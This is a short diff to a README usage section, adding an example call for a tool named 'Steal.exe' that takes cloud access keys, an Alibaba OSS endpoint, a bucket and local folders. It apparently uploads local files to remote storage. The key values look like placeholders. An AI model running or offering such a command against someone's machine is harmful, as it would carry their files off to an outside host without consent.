@@ -26,4 +26,6 @@ Options:
         AccessKeyId
   -s string
         AccessKeySecret
+        
+Example: Steal.exe -k LTAI5tKKfgtesdcvbhgtyujk -s eEm9g297VRTHpGfrtEDrf345DDBGdce -e oss-cn-hangzhou.aliyuncs.com -b test -f D:\example\src -d D:\example\src\test,D:\example\src\upload
 ```
